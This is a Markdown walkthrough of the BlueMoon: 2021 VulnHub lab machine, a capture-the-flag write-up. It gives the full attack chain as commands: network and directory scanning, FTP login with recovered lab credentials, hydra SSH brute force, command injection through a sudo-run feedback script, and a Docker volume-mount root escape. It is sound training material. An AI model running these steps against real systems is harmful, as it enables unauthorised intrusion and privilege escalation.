# BlueMoon: 2021 - VulnHub Walkthrough

Detailed walkthrough of the **BlueMoon: 2021** CTF from VulnHub. This machine involves web enumeration, QR code decoding, custom password brute-forcing, lateral movement via script injection, and privilege escalation through Docker.

## 🛠️ Lab Environment
* **Attacker OS:** Kali Linux (IP: 192.168.56.102)
* **Target OS:** BlueMoon (IP: 192.168.56.101)
* **Virtualization:** QEMU/KVM / VirtualBox

---

## 🛡️ System Hacking Stages

### 1. Reconnaissance & Scanning
We start with knowing our(attacker) Ip address first

```bash
ifconfig
```

Next we find which one is the target's ip address by using:

```bash
nmap -sn 192.168.56.0/24
```

once we know the target IP address we proceed to do port scanning by using:

```bash
nmap -sC -sV -Pn -vv 192.168.56.101
```

After knowing there are some ports are open, we proceed to do gobuster scanning:

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

after scanning, it will show what "keyword" available for us to use it in the browser to find the username and password for the target's device.

the keyword will be appear as ``` hidden_text ``` and can be paste in the searchbar as:

```bash
http://192.168.56.101/hidden_text
```

### 2 Gaining Access (Exploitation)
After searching the link above it will take you to a ``` Maintenance ``` page. But there is something different about the ``` Thank You ... ``` text. when you click it, it is actually a QR Code that will give us the user and password for gaining access to the target's machine.

The user and password are ``` userftp ``` and ``` ftpp@ssword ```

----------

After getting the user and password, type ``` ftp <TARGET IP> ``` in the attacker's terminal and type in the target's user and password, and that's it, you have the access for the target's machine

----------

After getting access to the target's machine, type in ``` ls ``` in the terminal, and you will find two file named ``` information.txt ``` and ``` p_lists.txt ```.

``` information.txt ``` is to know the user for ssh later, and ``` p_lists.txt ``` is the lists of various password for the ssh user.

----------

Before that you need to download those two files by typing:

```bash
bin
```

and than:

```bash
get information.txt
```

```bash
get p_lists.txt
```

this way is to first save the files in the desktop

After downloaded, you can exit the ftp by typing ``` exit ```.

-------------

After exit, to know the ssh user, type:

```bash
cat information.txt
```

this will show who is the user, at this point the user is ``` Robin ```

-------------

To know the password for Robin's ssh, we need to use hydra to fetch which one is their password by typing

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.101
```

The password will appear as ``` k4rv3ndh4nh4ck3r ```.

After knowing the password type in this in the terminal:

```bash
ssh robin@192.168.56.101
```

and enter the password ``` k4rv3ndh4nh4ck3r ``` and boom, you know have access to robin's account in the target's machine.

--------------

### 3. Escalate Privileges
If you type in ``` sudo -l ```, we can see that the use Robin is only low-level and can't access sudo(root). But there is another user called "Jerry", that user have an access to the sudo.

so we need to have access to Jerry.

first, let us execute as Jerry:

```bash
sudo -u jerry /home/robin/project/feedback.sh
```

---------

After that, enter any name like ``` test ```\
and for the feedback type in /bin/bash

------

After that, type in ``` whoami ```, this will show as "Jerry"\
now type in this to gain access as Jerry:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

this will automatically change the account from robin to jerry

---------

after that type in ``` cd ``` to change directory just incase, and you will see user2.txt and will find the flag in there

---------

Now for the last step, getting the root access.

type in ``` id ``` while in the user jerry id, you will see ``` 114(docker) ``` and the back, there will be our root access.

type in:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---------

### Claiming the Root
you will have the access to the docker. 

1. Go to the root directory

```bash
cd /root
```

2. List the files:

```bash
ls
```

3. Read the final flag

```bash
cat root.txt
```

-------

Now we have completed the BlueMoon:2021 CTF!!!
